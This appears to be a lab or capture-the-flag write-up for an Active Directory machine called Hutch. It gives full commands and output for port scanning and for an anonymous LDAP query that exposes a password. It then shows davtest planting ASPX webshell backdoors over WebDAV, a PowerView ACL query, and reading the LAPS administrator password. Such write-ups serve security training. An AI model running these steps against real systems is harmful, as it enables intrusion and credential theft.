---
description: Lots of systematic enumeration.
---

# Hutch

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.197.122
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 00:30 +08
Nmap scan report for 192.168.197.122
Host is up (0.17s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49672/tcp open  unknown
49674/tcp open  unknown
49687/tcp open  unknown
```

An AD machine.&#x20;

### Initial Enumeration -> Creds

Port 80 hosted a default IIS server:

<figure><img src="../../../.gitbook/assets/image (1234).png" alt=""><figcaption></figcaption></figure>

Directory scans reveal nothing much. A detailed `nmap` scan on the port reveals that this does have a webdav instance:

```
$ sudo nmap -p 80 -sC -sV --min-rate 3000 192.168.197.122                     
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 00:34 +08
Nmap scan report for 192.168.197.122
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Server Date: Wed, 05 Jul 2023 16:34:31 GMT
|   Server Type: Microsoft-IIS/10.0
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav" %}

However, we don't have any credentials for it:

```
$ davtest -url http://192.168.197.122
********************************************************
 Testing DAV connection
OPEN            FAIL:   http://192.168.197.122  Unauthorized. Basic realm="192.168.197.122"
```

For SMB, `enum4linux` reveals nothing of interest regarding the domain, but it does accept null credentials.&#x20;

<figure><img src="../../../.gitbook/assets/image (1023).png" alt=""><figcaption></figcaption></figure>

Now we can move onto LDAP, and we can check whether null credentials are accepted here using `ldapsearch`:

{% code overflow="wrap" %}
```
$ ldapsearch -x -H ldap://192.168.197.122 -D '' -w '' -b "DC=hutch,DC=offsec" > ldap.txt
```
{% endcode %}

At the very end of the file, we can find some credentials:

<figure><img src="../../../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>

This user's SAM Account Name is listed as `fmcsorley`, but we cannot use these credentials to `evil-winrm` in it seems. &#x20;

### Davtest -> RCE

Since we have credentials, we can try to place files on the website such as ASPX reverse shells (since this is running IIS). We can test these credentials with `davtest`:

```
$ davtest -auth fmcsorley:CrabSharkJellyfish192 -sendbd auto -url http://192.168.197.122
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://192.168.197.122
********************************************************
NOTE    Random string for this session: YuAxJmlk
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://192.168.197.122/DavTestDir_YuAxJmlk
********************************************************
 Sending test files
PUT     jsp     SUCCEED:        http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.jsp
PUT     pl      SUCCEED:        http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.pl
PUT     asp     SUCCEED:        http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.asp
PUT     shtml   SUCCEED:        http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.shtml
PUT     php     SUCCEED:        http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.php
PUT     cfm     SUCCEED:        http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.cfm
PUT     txt     SUCCEED:        http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.txt
PUT     jhtml   SUCCEED:        http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.jhtml
PUT     cgi     SUCCEED:        http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.cgi
PUT     html    SUCCEED:        http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.html
PUT     aspx    SUCCEED:        http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.aspx
********************************************************
 Checking for test file execution
EXEC    jsp     FAIL
EXEC    pl      FAIL
EXEC    asp     SUCCEED:        http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.asp
EXEC    shtml   FAIL
EXEC    php     FAIL
EXEC    cfm     FAIL
EXEC    txt     SUCCEED:        http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.txt
EXEC    jhtml   FAIL
EXEC    cgi     FAIL
EXEC    html    SUCCEED:        http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.html
EXEC    aspx    SUCCEED:        http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.aspx
********************************************************
 Sending backdoors
PUT Shell:      asp     SUCCEED:        http://192.168.197.122/DavTestDir_YuAxJmlk/YuAxJmlk_aspx_cmd.aspx
PUT Shell:      asp     SUCCEED:        http://192.168.197.122/DavTestDir_YuAxJmlk/YuAxJmlk_asp_cmd.asp
** ERROR: Unable to find a backdoor for txt **
** ERROR: Unable to find a backdoor for html **
PUT Shell:      aspx    SUCCEED:        http://192.168.197.122/DavTestDir_YuAxJmlk/YuAxJmlk_aspx_cmd.aspx

********************************************************
/usr/bin/davtest Summary:
Created: http://192.168.197.122/DavTestDir_YuAxJmlk
PUT File: http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.jsp
PUT File: http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.pl
PUT File: http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.asp
PUT File: http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.shtml
PUT File: http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.php
PUT File: http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.cfm
PUT File: http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.txt
PUT File: http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.jhtml
PUT File: http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.cgi
PUT File: http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.html
PUT File: http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.aspx
Executes: http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.asp
Executes: http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.txt
Executes: http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.html
Executes: http://192.168.197.122/DavTestDir_YuAxJmlk/davtest_YuAxJmlk.aspx
PUT Shell: http://192.168.197.122/DavTestDir_YuAxJmlk/YuAxJmlk_aspx_cmd.aspx
PUT Shell: http://192.168.197.122/DavTestDir_YuAxJmlk/YuAxJmlk_asp_cmd.asp
PUT Shell: http://192.168.197.122/DavTestDir_YuAxJmlk/YuAxJmlk_aspx_cmd.aspx
```

`davtest` would place a few backdoors for us, and we can use that to execute commands on the machine:

<figure><img src="../../../.gitbook/assets/image (3791).png" alt=""><figcaption></figcaption></figure>

Then, we can easily get a reverse shell as this user.&#x20;

<figure><img src="../../../.gitbook/assets/image (1456).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### LAPS-> Administrator Creds

On the machine, LAPS is installed.&#x20;

```
 Directory of C:\Program Files

02/16/2021  11:27 PM    <DIR>          .
02/16/2021  11:27 PM    <DIR>          ..
11/04/2020  05:08 AM    <DIR>          Common Files
11/03/2020  09:34 PM    <DIR>          internet explorer
11/03/2020  10:59 PM    <DIR>          LAPS
11/03/2020  10:37 PM    <DIR>          MSBuild
11/03/2020  10:37 PM    <DIR>          Reference Assemblies
02/16/2021  11:27 PM    <DIR>          VMware
12/08/2020  08:22 PM    <DIR>          Windows Defender
12/08/2020  08:22 PM    <DIR>          Windows Defender Advanced Threat Protection
09/15/2018  12:19 AM    <DIR>          Windows Mail
11/03/2020  09:34 PM    <DIR>          Windows Media Player
09/15/2018  12:19 AM    <DIR>          Windows Multimedia Platform
09/15/2018  12:28 AM    <DIR>          windows nt
11/03/2020  09:34 PM    <DIR>          Windows Photo Viewer
09/15/2018  12:19 AM    <DIR>          Windows Portable Devices
09/15/2018  12:19 AM    <DIR>          Windows Security
09/15/2018  12:19 AM    <DIR>          WindowsPowerShell
```

We could potentially get the administrator's password from this. First, we need to see who can read it using `PowerView.ps1`:

{% code overflow="wrap" %}
```powershell
PS C:\Windows\Tasks> Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-Admpwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | select IdentityName

IdentityName       
------------       
HUTCH\Domain Admins
HUTCH\fmcsorley 
```
{% endcode %}

The user `fmcsorley` can read the password. I checked using `ldapsearch`, and sure enough it was there:

{% code overflow="wrap" %}
```
$ ldapsearch -x -H ldap://192.168.197.122 -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b "DC=hutch,DC=offsec" > fmc.txt
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (1932).png" alt=""><figcaption></figcaption></figure>

We can then `evil-winrm` in using it:

<figure><img src="../../../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>

Rooted!&#x20;
